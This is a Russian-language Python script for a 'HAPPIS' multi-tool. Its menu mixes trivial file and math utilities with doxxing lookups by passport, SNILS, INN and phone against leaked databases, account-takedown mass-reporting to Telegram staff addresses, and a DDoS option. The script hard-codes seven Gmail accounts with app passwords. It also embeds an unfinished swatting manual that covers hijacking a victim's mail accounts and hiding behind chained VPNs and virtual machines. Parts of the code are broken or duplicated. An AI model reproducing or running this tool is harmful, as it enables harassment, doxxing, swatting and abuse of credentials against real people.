
import json
import uuid
import threading
import random
import os
import subprocess
import requests
import sys
import requests
import numpy as np
import matplotlib.pyplot as plt
import datetime
import hashlib
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import webbrowser
from concurrent.futures import ThreadPoolExecutor
import csv
import sqlite3
from openpyxl import load_workbook
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
modules_to_import = [
    'requests',
    'numpy',
    'sys',
    'matplotlib',
    'datetime',
    'hashlib',
    'logging',
    'smtplib',
    'email',
    'webbrowser',
    'concurrent.futures',
    'csv',
    'sqlite3',
    'openpyxl',
    'bs4',
    'colorama'
]

for module in modules_to_import:
    try:
        __import__(module)
    except ImportError:
        print(f"Модуль {module} не найден. Установка...")
        subprocess.check_call(['pip', 'install', module])
import requests
import numpy as np
import matplotlib.pyplot as plt
import datetime
import hashlib
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import webbrowser
from concurrent.futures import ThreadPoolExecutor
import csv
import sqlite3
from openpyxl import load_workbook
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
def fetch_proxy_list(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            proxy_list = []
            for row in soup.find_all('tr'):
                columns = row.find_all('td')
                if len(columns) >= 2:
                    ip = columns[0].text.strip()
                    port = columns[1].text.strip()
                    proxy_list.append(f"{ip}:{port}")
            return proxy_list
        else:
            print(f"Failed to fetch proxy list. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Error fetching proxy list: {e}")
    return []
def generate_random_proxy(proxy_list):
    return random.choice(proxy_list)
init()
dcyan = Style.NORMAL + Fore.CYAN
cyan = Style.BRIGHT + Fore.CYAN
blueb = Style.BRIGHT + Fore.BLUE
white = Style.BRIGHT + Fore.WHITE
baza = Style.NORMAL
# Цвета для текста
COLOR_GREEN = Fore.GREEN
COLOR_RESET = Style.RESET_ALL
class TerminalColors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    END = '\033[0m'

# Function to generate a gradient from red to white
def generate_red_to_white_gradient(steps=30):
    colors = [
        (255, 0, 0),  # Red
        (255, 255, 255)  # White
    ]
    gradient_colors = []
    n = len(colors)
    for i in range(steps):
        frac = i / steps
        idx1 = int(frac * (n - 1))
        idx2 = min(idx1 + 1, n - 1)
        t = frac * (n - 1) - idx1
        r = int(colors[idx1][0] * (1 - t) + colors[idx2][0] * t)
        g = int(colors[idx1][1] * (1 - t) + colors[idx2][1] * t)
        b = int(colors[idx1][2] * (1 - t) + colors[idx2][2] * t)
        gradient_colors.append(f'\033[38;2;{r};{g};{b}m')
    return gradient_colors

def apply_gradient(text, colors):
    colored_text = ""
    color_length = len(colors)
    for i, char in enumerate(text):
        colored_text += colors[i % color_length] + char
    return colored_text + TerminalColors.END
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
def get_ip_info(ip_address):
    url = f"https://ipinfo.io/{ip_address}/json"
    response = requests.get(url)
    data = response.json()
    return data
def get_ip_type(ip_address):
    url = f"https://ipwho.is/{ip_address}"
    response = requests.get(url)
    ip_info = response.json()
    return ip_info

email_list = [
    "support@telegram.org",
    "dmca@telegram.org",
    "security@telegram.org",
    "sms@telegram.org",
    "info@telegram.org",
    "marta@telegram.org",
    "spam@telegram.org",
    "alex@telegram.org",
    "abuse@telegram.org",
    "pavel@telegram.org",
    "durov@telegram.org",
    "elies@telegram.org",
    "ceo@telegram.org",
    "mr@telegram.org",
    "levlam@telegram.org",
    "perekopsky@telegram.org",
    "recover@telegram.org",
    "germany@telegram.org",
    "hyman@telegram.org",
    "qa@telegram.org",
    "stickers@telegram.org",
    "ir@telegram.org",
    "vadim@telegram.org",
    "shyam@telegram.org",
    "stopca@telegram.org",
    "u003esupport@telegram.org",
    "ask@telegram.org",
    "125support@telegram.org",
    "me@telegram.org",
    "enquiries@telegram.org",
    "api_support@telegram.org",
    "marketing@telegram.org",
    "ca@telegram.org",
    "recovery@telegram.org",
    "http@telegram.org",
    "corp@telegram.org",
    "corona@telegram.org",
    "ton@telegram.org",
    "sticker@telegram.org"
]

# Список учетных записей отправителей
senders = [
    {"email": "nzxtline@gmail.com", "password": "igax bnpq aqux yoca"},
    {"email": "etheriuethernet@gmail.com", "password": "iwuv pzpd wgih xrdf"},
    {"email": "killkillerov17@gmail.com", "password": "pedg wjah jgdi unum"},
    {"email": "dicacc1337@gmail.com", "password": "rnyi vnpc fyfo hwlb"},
    {"email": "snoserhappis@gmail.com", "password": "quuq srqg asei chsq"},
    {"email": "snoserhappis2@gmail.com", "password": "kjit rmzn ykcn updn"},
    {"email": "snoserhappis3@gmail.com", "password": "xjal rjbg lvoz movq"},
    # Добавьте больше учетных записей при необходимости
]
def send_email(sender_email, sender_password, subject, body, recipient_email):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject

    # Очистка тела письма от неразрывных пробелов
    body_cleaned = body.replace('\xa0', ' ')
    msg.attach(MIMEText(body_cleaned, 'plain', 'utf-8'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        text = msg.as_string()
        server.sendmail(sender_email, recipient_email, text)
        server.quit()
        print(f"Email sent to {recipient_email} from {sender_email}")
        return True
    except Exception as e:
        print(f"Failed to send email to {recipient_email} from {sender_email}: {str(e)}")
        return False
def apply_gradient(text, colors):
    colored_text = ""
    color_length = len(colors)
    for i, char in enumerate(text):
        colored_text += colors[i % color_length] + char
    return colored_text + TerminalColors.END

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def read_file(filename):
    try:
        with open(filename, 'r') as file:
            content = file.read()
        return content
    except FileNotFoundError:
        return f"Файл '{filename}' не найден."
    except Exception as e:
        return f"Ошибка при чтении файла '{filename}': {str(e)}"

def write_file(filename, content):
    try:
        with open(filename, 'w') as file:
            file.write(content)
        return f"Данные успешно записаны в файл '{filename}'."
    except Exception as e:
        return f"Ошибка при записи в файл '{filename}': {str(e)}"

def copy_file(src, dst):
    try:
        shutil.copyfile(src, dst)
        return f"Файл успешно скопирован из '{src}' в '{dst}'."
    except FileNotFoundError:
        return f"Файл '{src}' не найден."
    except Exception as e:
        return f"Ошибка при копировании файла: {str(e)}"


def delete_file(filename):
    try:
        os.remove(filename)
        return f"Файл '{filename}' успешно удален."
    except FileNotFoundError:
        return f"Файл '{filename}' не найден."
    except Exception as e:
        return f"Ошибка при удалении файла '{filename}': {str(e)}"


def list_files(directory):
    try:
        files = os.listdir(directory)
        return files
    except FileNotFoundError:
        return f"Директория '{directory}' не найдена."
    except Exception as e:
        return f"Ошибка при получении списка файлов: {str(e)}"


def create_directory(directory):
    try:
        os.makedirs(directory)
        return f"Директория '{directory}' успешно создана."
    except FileExistsError:
        return f"Директория '{directory}' уже существует."
    except Exception as e:
        return f"Ошибка при создании директории '{directory}': {str(e)}"


def delete_directory(directory):
    try:
        os.rmdir(directory)
        return f"Директория '{directory}' успешно удалена."
    except FileNotFoundError:
        return f"Директория '{directory}' не найдена."
    except OSError as e:
        return f"Ошибка при удалении директории '{directory}': {str(e)}"


def custom_database():
    try:
        print(
            f"\n{dcyan}[{white}~{dcyan}]{cyan} Пример : C:\\Users\\Admin\\Desktop\\Soft\\GetContact.csv \n{dcyan}[{white}~{dcyan}]{cyan} Или же поместите базу в одну папку с софтом и укажите название файла с расширением"
            f"\n{dcyan}[{white}~{dcyan}]{cyan} Также не забывайте указывать расширение базы данных!")

        file_path = input(f"\n{dcyan}[{white}?{dcyan}]{cyan} Введите путь к базе данных : ")
        search_text = input(
            f"{dcyan}[{white}?{dcyan}]{cyan} Введите параметр, по которому хотите найти информацию в бд : ")
        coder = input(f"{dcyan}[{white}?{dcyan}]{cyan} Выберите кодировку (Часто это utf-8 либо cp1251) : ")
    except Exception as e:
        print(f"Ошибка при работе с базой данных: {str(e)}")


def get_request(url):
    try:
        response = requests.get(url)
        return response.text
    except requests.exceptions.RequestException as e:
        return f"Ошибка при выполнении GET запроса: {str(e)}"

url = "https://example.com"
print(get_request(url))


def post_request(url, data):
    try:
        response = requests.post(url, data=data)
        return response.text
    except requests.exceptions.RequestException as e:
        return f"Ошибка при выполнении POST запроса: {str(e)}"


def fetch_from_api(url):
    try:
        response = requests.get(url)
        return response.json()
    except requests.exceptions.RequestException as e:
        return f"Ошибка при получении данных с API: {str(e)}"
    except json.JSONDecodeError as e:
        return f"Ошибка при декодировании JSON: {str(e)}"


def parse_json(json_data):
    try:
        parsed_data = json.loads(json_data)
        return parsed_data
    except json.JSONDecodeError as e:
        return f"Ошибка при парсинге JSON данных: {str(e)}"


def sort_list(data):
    try:
        data.sort()
        return data
    except Exception as e:
        return f"Ошибка при сортировке списка: {str(e)}"


def filter_list(data, condition):
    try:
        filtered_data = list(filter(condition, data))
        return filtered_data
    except Exception as e:
        return f"Ошибка при фильтрации списка: {str(e)}"


def generate_random_number(min_num, max_num):
    try:
        return random.randint(min_num, max_num)
    except ValueError:
        return f"Ошибка: Неверные границы чисел."
    except Exception as e:
        return f"Ошибка при генерации случайного числа: {str(e)}"


def encrypt_data(data):
    try:
        encoded_data = hashlib.sha256(data.encode()).hexdigest()
        return encoded_data
    except Exception as e:
        return f"Ошибка при шифровании данных: {str(e)}"


def decrypt_data(data):
    try:
        decoded_data = hashlib.sha256(data.encode()).hexdigest()
        return decoded_data
    except Exception as e:
        return f"Ошибка при дешифровании данных: {str(e)}"


def plot_data(x, y):
    try:
        plt.plot(x, y)
        plt.xlabel('X-axis')
        plt.ylabel('Y-axis')
        plt.title('Plot')
        plt.show()
        return "График успешно построен."
    except Exception as e:
        return f"Ошибка при построении графика: {str(e)}"


def generate_chart(data):
    try:
        data_dict = json.loads(data)
        labels = list(data_dict.keys())
        values = list(data_dict.values())
        plt.pie(values, labels=labels, autopct='%1.1f%%')
        plt.title('Pie Chart')
        plt.show()
        return "Диаграмма успешно сгенерирована."
    except Exception as e:
        return f"Ошибка при генерации диаграммы: {str(e)}"


def find_substring(main_string, substring):
    try:
        index = main_string.index(substring)
        return f"Подстрока найдена в позиции {index}."
    except ValueError:
        return "Подстрока не найдена."
    except Exception as e:
        return f"Ошибка при поиске подстроки: {str(e)}"


def replace_text(text, old, new):
    try:
        replaced_text = text.replace(old, new)
        return replaced_text
    except Exception as e:
        return f"Ошибка при замене текста: {str(e)}"


def split_string(text, delimiter):
    try:
        split_text = text.split(delimiter)
        return split_text
    except Exception as e:
        return f"Ошибка при разделении строки: {str(e)}"


def change_case(text, case):
    try:
        if case == 'upper':
            return text.upper()
        elif case == 'lower':
            return text.lower()
        else:
            return "Неверно указан регистр. Выберите 'upper' или 'lower'."
    except Exception as e:
        return f"Ошибка при изменении регистра строки: {str(e)}"


def calculate_mean(data):
    try:
        mean = np.mean(data)
        return mean
    except Exception as e:
        return f"Ошибка при вычислении среднего значения: {str(e)}"


def calculate_median(data):
    try:
        median = np.median(data)
        return median
    except Exception as e:
        return f"Ошибка при вычислении медианы: {str(e)}"


def calculate_std_deviation(data):
    try:
        std_deviation = np.std(data)
        return std_deviation
    except Exception as e:
        return f"Ошибка при вычислении стандартного отклонения: {str(e)}"


def calculate_sum(data):
    try:
        total_sum = sum(data)
        return total_sum
    except Exception as e:
        return f"Ошибка при вычислении суммы: {str(e)}"


def get_current_time():
    try:
        current_time = datetime.datetime.now().time()
        return current_time.strftime('%H:%M:%S')
    except Exception as e:
        return f"Ошибка при получении текущего времени: {str(e)}"


def get_current_date():
    try:
        current_date = datetime.datetime.now().date()
        return current_date.strftime('%Y-%m-%d')
    except Exception as e:
        return f"Ошибка при получении текущей даты: {str(e)}"


def format_date(date, format):
    try:
        formatted_date = date.strftime(format)
        return formatted_date
    except Exception as e:
        return f"Ошибка при форматировании даты: {str(e)}"


def load_image(filename):
    try:
        with open(filename, 'rb') as f:
            image_data = f.read()
        return image_data
    except FileNotFoundError:
        raise FileNotFoundError(f"Ошибка: Файл '{filename}' не найден.")
    except Exception as e:
        raise Exception(f"Ошибка при загрузке изображения: {str(e)}")


def save_image(image, filename):
    try:
        with open(filename, 'wb') as f:
            f.write(image)
    except Exception as e:
        raise Exception(f"Ошибка при сохранении изображения: {str(e)}")


def connect_to_database(db_url):
    try:
        conn = sqlite3.connect(db_url)
        return conn
    except Exception as e:
        raise Exception(f"Ошибка при подключении к базе данных: {str(e)}")


def execute_sql_query(conn, query):
    try:
        cursor = conn.cursor()
        cursor.execute(query)
        conn.commit()
    except Exception as e:
        raise Exception(f"Ошибка при выполнении SQL запроса: {str(e)}")


try:
    image_data = load_image('example.jpg')

except Exception as e:
    print(f"Ошибка: {str(e)}")

try:
    image_data = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR...'
    save_image(image_data, 'example_saved.png')

except Exception as e:
    print(f"Ошибка: {str(e)}")

try:
    conn = connect_to_database('example.db')
    print("Успешное подключение к базе данных.")
except Exception as e:
    print(f"Ошибка: {str(e)}")

try:
    conn = connect_to_database('example.db')
    query = ""
    result = execute_sql_query(conn, query)
    print(result)
except Exception as e:
    print(f"Ошибка: {str(e)}")


def connect_to_database(db_url):
    try:
        # Ваш код подключения к базе данных
        return f"Успешное подключение к базе данных по URL: '{db_url}'."
    except Exception as e:
        return f"Ошибка при подключении к базе данных: {str(e)}"


import sqlite3


def execute_sql_query(query):
    try:
        conn = sqlite3.connect('example.db')
        cursor = conn.cursor()
        cursor.execute(query)
        conn.commit()
        return
    except sqlite3.Error as e:
        return f"Ошибка при выполнении SQL запроса: {str(e)}"
    finally:
        if conn:
            conn.close()


query = ""
result = execute_sql_query(query)
print(result)


def search_all_databases(value):
    base_dir = 'c:/users/base'
    if not os.path.exists(base_dir):
        print(f"{TerminalColors.RED}Директория {base_dir} не существует.{TerminalColors.END}")
        return

    databases = [os.path.join(base_dir, f) for f in os.listdir(base_dir) if
                 f.endswith(('.csv', '.xlsx', '.db', '.sqlite', '.txt'))]

    if not databases:
        print(f"{TerminalColors.RED}В указанной директории нет подходящих баз данных.{TerminalColors.END}")
        return

    with ThreadPoolExecutor(max_workers=10) as executor:
        for database in databases:
            file_format = database.split('.')[-1]
            if file_format == 'csv':
                executor.submit(search_csv, database, value)
            elif file_format == 'xlsx':
                executor.submit(search_xlsx, database, value)
            elif file_format == 'txt':
                executor.submit(search_txt, database, value)
            elif file_format in ('db', 'sqlite'):
                query = f"SELECT * FROM table WHERE column LIKE '%{value}%'"
                executor.submit(search_sql, database, query)


def search_csv(database, value):
    try:
        df = pd.read_csv(database)
        result = df[df.apply(lambda row: row.astype(str).str.contains(value, case=False).any(), axis=1)]
        if not result.empty:
            print(f"{TerminalColors.GREEN}Результаты поиска в {database}:{TerminalColors.END}")
            print(result)
    except Exception as e:
        print(f"{TerminalColors.RED}Ошибка при поиске в {database}: {e}{TerminalColors.END}")


def search_xlsx(database, value):
    try:
        df = pd.read_excel(database)
        result = df[df.apply(lambda row: row.astype(str).str.contains(value, case=False).any(), axis=1)]
        if not result.empty:
            print(f"{TerminalColors.GREEN}Результаты поиска в {database}:{TerminalColors.END}")
            print(result)
    except Exception as e:
        print(f"{TerminalColors.RED}Ошибка при поиске в {database}: {e}{TerminalColors.END}")


def generate_text_with_typos(num_lines, comma_frequency, typo_level):
    if not os.path.exists('phrases.txt'):
        print('phrases.txt does not exist. Please create this file and add some lines to it.')
        return

    with open('phrases.txt', 'r', encoding='utf-8') as f:
        lines = f.readlines()

    lines = [line.strip() for line in lines]

    generated_text = []
    used_lines = []

    typo_percentages = {
        1: 0.01,  # 1% слов с опечатками
        2: 0.02,  # 2% слов с опечатками
        3: 0.1  # 10% слов с опечатками
    }

    for i in range(num_lines):
        available_lines = [line for line in lines if line not in used_lines]

        if available_lines:
            next_line = random.choice(available_lines)

            if i > 0 and i % comma_frequency == 0:
                generated_text.append(',')

            words = next_line.split()

            if typo_level > 0:
                words_with_typos = []

                for word in words:
                    if random.random() < typo_percentages[typo_level]:
                        typo_word = generate_typo(word)
                        words_with_typos.append(typo_word)
                    else:
                        words_with_typos.append(word)

                line_with_typos = ' '.join(words_with_typos)
                generated_text.append(line_with_typos)
            else:
                generated_text.append(next_line)

            used_lines.append(next_line)
        else:
            break

    generated_text = ' '.join(generated_text)

    with open('generated.txt', 'w', encoding='utf-8') as f:
        f.write(generated_text)

    print(generated_text)


def generate_typo(word):
    typo_variations = {
        'a': ['s', 'z', 'q'],
        'b': ['v', 'n', 'g'],
        'c': ['x', 'v', 'd'],
        'd': ['s', 'f', 'e'],
        'e': ['w', 'r', 's'],
        'f': ['d', 'g', 't'],
        'g': ['f', 'h', 'y'],
        'h': ['g', 'j', 'u'],
        'i': ['o', 'u', 'k'],
        'j': ['h', 'k', 'u'],
        'k': ['j', 'l', 'i'],
        'l': ['k', 'p', 'o'],
        'm': ['n', 'b', 'h'],
        'n': ['m', 'b', 'j'],
        'o': ['i', 'p', 'l'],
        'p': ['o', 'l', '0'],
        'q': ['w', 's', 'a'],
        'r': ['e', 't', 'd'],
        's': ['a', 'd', 'z'],
        't': ['r', 'y', 'f'],
        'u': ['y', 'i', 'j'],
        'v': ['c', 'b', 'g'],
        'w': ['q', 'e', 's'],
        'x': ['z', 'c', 'd'],
        'y': ['t', 'u', 'h'],
        'z': ['x', 'a', 's']
    }

    possible_typos = typo_variations.get(word[-1], [])
    typo_word = list(word)

    if possible_typos:
        random_typo = random.choice(possible_typos)
        typo_word[-1] = random_typo

    return ''.join(typo_word)


first_names = ["John", "Alice", "Michael", "Emily", "David", "Sarah"]
last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia"]
professions = ["engineer", "teacher", "doctor", "artist", "lawyer", "chef"]
nationalities = ["American", "British", "French", "German", "Japanese", "Russian"]


def generate_random_person():
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    age = random.randint(18, 80)
    profession = random.choice(professions)
    nationality = random.choice(nationalities)

    return {
        "first_name": first_name,
        "last_name": last_name,
        "age": age,
        "profession": profession,
        "nationality": nationality
    }


def print_beautiful_text(text):
    square_size = len(text) + 4

    print("\u250f" + "\u2501" * square_size + "\u2513")
    print("\u2503 " + text.strip() + " \u2503")
    print("\u2517" + "\u2501" * square_size + "\u251b")


def get_user_input(prompt, validate_fn):
    while True:
        try:
            value = validate_fn(input(prompt))
            return value
        except ValueError as e:
            print(e)


def search_txt(database, value):
    try:
        with open(database, 'r', encoding='utf-8') as file:
            lines = file.readlines()
            matches = [line for line in lines if value.lower() in line.lower()]
            if matches:
                print(f"{TerminalColors.GREEN}Результаты поиска в {database}:{TerminalColors.END}")
                for match in matches:
                    print(match.strip())
    except Exception as e:
        print(f"{TerminalColors.RED}Ошибка при поиске в {database}: {e}{TerminalColors.END}")


def search_sql(database, query):
    try:
        conn = sqlite3.connect(database)
        df = pd.read_sql_query(query, conn)
        if not df.empty:
            print(f"{TerminalColors.GREEN}Результаты поиска в {database}:{TerminalColors.END}")
            print(df)
        conn.close()
    except Exception as e:
        print(f"{TerminalColors.RED}Ошибка при поиске в {database}: {e}{TerminalColors.END}")


def log_event(event):
    try:
        logging.basicConfig(filename='app.log', level=logging.INFO)
        logging.info(event)
        return f"Событие успешно залогировано: '{event}'."
    except Exception as e:
        return f"Ошибка при логировании события: {str(e)}"


def generate_uuid():
    try:
        return uuid.uuid4()
    except Exception as e:
        return f"Ошибка при генерации уникального идентификатора UUID: {str(e)}"


def main_menu():
    menu = """
           HHH   HHH   AAA   PPPPP  PPPPP  III  SSSSS    CCCC  L     III EEEEE NN    N TTTTT
           HHH   HHH  AAAAA  PPPPP  PPPPP  III SSS      C    C L     III E     N N   N   T
           HHHHHHHHH AAAAAAA PP  PP PP  PP III  SSSSS   C    C L     III E     N N   N   T
           HHH   HHH AA   AA PP  PP PP  PP III     SSS  C      L     III EEEE  N  N  N   T
           HHH   HHH AA   AA PP  PP PP  PP III    SSS   C    C L     III E     N   N N   T
           HHH   HHH AA   AA PP  PP PP  PP III SSSSS     CCCC  LLLLL III EEEEE N    NN   T

                                     H A P P I S - MULTI-TOOL

1.  Чтение файла               11. Парсинг JSON               21. Разделение строки                    
2.  Запись в файл              12. Сортировка списка          22. Изменение регистра строки            
3.  Копирование файла          13. Фильтрация списка          23. Вычисление среднего значения         
4.  Удаление файла             14. Генерация случайного числа 24. Вычисление медианы                   
5.  Список файлов в директории 15. Шифрование данных          25. Вычисление стандартного отклонения   
6.  Создание директории        16. Дешифрование данных        26. Вычисление суммы                     
7.  Удаление директории        17. Построение графика         27. Получение текущего времени  
8.  Отправка GET запроса       18. Генерация диаграммы        28. Получение текущей даты             
9.  Отправка POST запроса      19. Поиск подстроки            29. Форматирование даты              
10. Получение данных с API     20. Замена текста              30. Загрузка изображения       
42. Поиск по айпи              51. Поиск по ФБ                60. сообщит об ошибок   
43. Поиск по нику              52. Поиск по ДС                61. мануал по свату
44. Поиск по логину            53. Поиск по SIGNAL            62. генератор троллинга
45. Поиск по паролю            54. Поиск по EMAIL             63. снос по ID          
46. Поиск по инн               55. Поиск по GMAIL             64. дyдос             
47. Поиск по снилс             56. Поиск по ФИО               65. генератор личности
48. Поиск по паспорту          57. Поиск по номеру            78. шаблон для вьебов
49. Поиск по ВК                58. Поиск по домену            36. Универсальный поиск
50. Поиск по ID                59. Поиск по веб-сайту         79. Выход 
"""
    while True:
        gradient_colors = generate_red_to_white_gradient()
        colored_menu = apply_gradient(menu, gradient_colors)
        print(colored_menu)

        choice = input("Выберите действие: ")

        if choice == '1':
            filename = input("Введите имя файла для чтения: ")
            result = read_file(filename)
            print(result)
        elif choice == '2':
            filename = input("Введите имя файла для записи: ")
            content = input("Введите данные для записи: ")
            result = write_file(filename, content)
            print(result)
        elif choice == '3':
            src = input("Введите путь к исходному файлу: ")
            dst = input("Введите путь к целевому файлу: ")
            result = copy_file(src, dst)
            print(result)
        elif choice == '4':
            filename = input("Введите имя файла для удаления: ")
            result = delete_file(filename)
            print(result)
        elif choice == '5':
            directory = input("Введите путь к директории: ")
            result = list_files(directory)
            if isinstance(result, list):
                print(f"Файлы в директории '{directory}':")
                for file in result:
                    print(file)
            else:
                print(result)
        elif choice == '6':
            directory = input("Введите имя новой директории: ")
            result = create_directory(directory)
            print(result)
        elif choice == '7':
            directory = input("Введите имя директории для удаления: ")
            result = delete_directory(directory)
            print(result)
        elif choice == '8':
            url = input("Введите URL для GET запроса: ")
            result = get_request(url)
            print(result)
        elif choice == '9':
            url = input("Введите URL для POST запроса: ")
            data = input("Введите данные для POST запроса: ")
            result = post_request(url, data)
            print(result)
        elif choice == '10':
            url = input("Введите URL для получения данных с API: ")
            result = fetch_from_api(url)
            if isinstance(result, dict):
                print("Данные с API:")
                print(json.dumps(result, indent=2))
            else:
                print(result)
        elif choice == '11':
            json_data = input("Введите JSON данные для парсинга: ")
            result = parse_json(json_data)
            print("Парсинг JSON данных:")
            print(json.dumps(result, indent=2))
        elif choice == '12':
            data = input("Введите данные для сортировки (через запятую): ").split(',')
            result = sort_list(data)
            print(result)
        elif choice == '13':
            data = input("Введите данные для фильтрации (через запятую): ").split(',')
            condition = input("Введите условие фильтрации (например, lambda x: x > 5): ")
            condition = eval(condition)
            result = filter_list(data, condition)
            print(result)
        elif choice == '14':
            min_num = int(input("Введите минимальное значение: "))
            max_num = int(input("Введите максимальное значение: "))
            result = generate_random_number(min_num, max_num)
            print(result)
        elif choice == '15':
            data = input("Введите данные для шифрования: ")
            result = encrypt_data(data)
            print(result)
        elif choice == '16':
            data = input("Введите данные для дешифрования: ")
            result = decrypt_data(data)
            print(result)
        elif choice == '17':
            x = input("Введите значения для оси X (через запятую): ").split(',')
            y = input("Введите значения для оси Y (через запятую): ").split(',')
            x = list(map(float, x))
            y = list(map(float, y))
            result = plot_data(x, y)
            print(result)
        elif choice == '18':
            data = input("Введите данные для генерации диаграммы (в формате JSON): ")
            result = generate_chart(data)
            print(result)
        elif choice == '19':
            main_string = input("Введите основную строку: ")
            substring = input("Введите подстроку для поиска: ")
            result = find_substring(main_string, substring)
            print(result)
        elif choice == '20':
            text = input("Введите текст: ")
            old = input("Введите текст для замены: ")
            new = input("Введите новый текст: ")
            result = replace_text(text, old, new)
            print(result)
        elif choice == '21':
            text = input("Введите текст для разделения: ")
            delimiter = input("Введите разделитель: ")
            result = split_string(text, delimiter)
            print(result)
        elif choice == '22':
            text = input("Введите текст для изменения регистра: ")
            case = input("Введите 'upper' для верхнего регистра, 'lower' для нижнего: ").lower()
            result = change_case(text, case)
            print(result)
        elif choice == '23':
            data = input("Введите данные для вычисления среднего значения (через запятую): ").split(',')
            data = list(map(float, data))
            result = calculate_mean(data)
            print(result)
        elif choice == '24':
            data = input("Введите данные для вычисления медианы (через запятую): ").split(',')
            data = list(map(float, data))
            result = calculate_median(data)
            print(result)
        elif choice == '25':
            data = input("Введите данные для вычисления стандартного отклонения (через запятую): ").split(',')
            try:
                data = list(map(float, data))
                result = calculate_std_deviation(data)
                print(result)
            except ValueError as e:
                print(f"Ошибка: {str(e)}")
        elif choice == '26':
            data = input("Введите данные для вычисления суммы (через запятую): ").split(',')
            try:
                data = list(map(float, data))
                result = calculate_sum(data)
                print(result)
            except ValueError as e:
                print(f"Ошибка: {str(e)}")
        elif choice == '27':
            result = get_current_time()
            print(result)
        elif choice == '28':
            result = get_current_date()
            print(result)
        elif choice == '29':
            date = input("Введите дату для форматирования (в формате YYYY-MM-DD): ")
            format = input("Введите формат вывода даты (например, %d %B %Y): ")
            try:
                date = datetime.datetime.strptime(date, "%Y-%m-%d").date()
                result = format_date(date, format)
                print(result)
            except ValueError as e:
                print(f"Ошибка при форматировании даты: {str(e)}")
        elif choice == '30':
            filename = input("Введите имя файла для загрузки изображения: ")
            result = load_image(filename)
            print(result)
        elif choice == '31':
            image = input("Введите путь к изображению: ")
            filename = input("Введите имя файла для сохранения изображения: ")
            result = save_image(image, filename)
            print(result)
        elif choice == '32':
            db_url = input("Введите URL базы данных для подключения: ")
            result = connect_to_database(db_url)
            print(result)
        elif choice == '33':
            query = input("Введите SQL запрос для выполнения: ")
            result = execute_sql_query(query)
            print(result)
        elif choice == '34':
            event = input("Введите событие для логирования: ")
            result = log_event(event)
            print(result)
        elif choice == '35':
            result = generate_uuid()
            print(result)
        elif choice == '36':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '37':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '38':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '39':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '40':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '41':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '42':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '43':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '44':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '45':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '46':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '47':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '48':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '49':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '50':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '51':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '52':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '53':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '54':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '55':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '56':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '57':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '58':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '59':
            search_value = input("Введите значение для поиска: ")
            search_all_databases(search_value)
        elif choice == '60':
            print("Для того чтобы сообщить об ошибке напишите мне по форме:")
            print("1. Какого числа вы заметили ошибку: ")
            print("2. Распишите ошибку: ")
            print("3. Что вы делали перед тем как появилась ошибка?: ")
            print("4. Доказательсто: ")
            webbrowser.open('https://t.me/suidcider', new=1)
        elif choice == '61':
            swat = """
Для начала требуется получить доступ к почтовым аккаунтам на mail.ru и proton.mail через соответствующие веб-сайты от имени жертвы. Подробности о процессе не требуются.

После завершения этого шага переходим в мессенджер Telegram и приобретаем виртуальные номера для protonMail или Mail.ru. Рекомендуемые боты, не склонные к утечке введенной информации и SMS, включают в себя @GreedySMSbot и @SMSBest_bot.

Затем, после приобретения виртуального номера, необходим хороший платный VPN и прокси. Рекомендуется использовать Mullvad VPN как наиболее надежный

После покупки виртуального номера для почты следует написать текст, который не попадет в спам. Лучше всего сформулировать его как руководство по "Swatting". Ниже представлен список инструментов, необходимых для успешной операции:

1. Операционная система Android.
2. Почтовый сервис Proton Mail.
3. Комбинация мультихоп VPN: Proton VPN и MullVad VPN.
4. Tor Browser с соответствующими плагинами или Firefox с плагинами.

Мультихоп представляет собой использование двух и более VPN одновременно на устройстве.

Шаги для подготовки:

1. Создание нового почтового ящика на Proton Mail.
2. Загрузка виртуальной машины на телефон.
3. Установка еще одной виртуальной машины внутри первой.
4. Загрузка MullVad VPN на телефон без виртуальной машины.
5. Установка того же VPN на первой виртуальной машине с выбором другого региона.
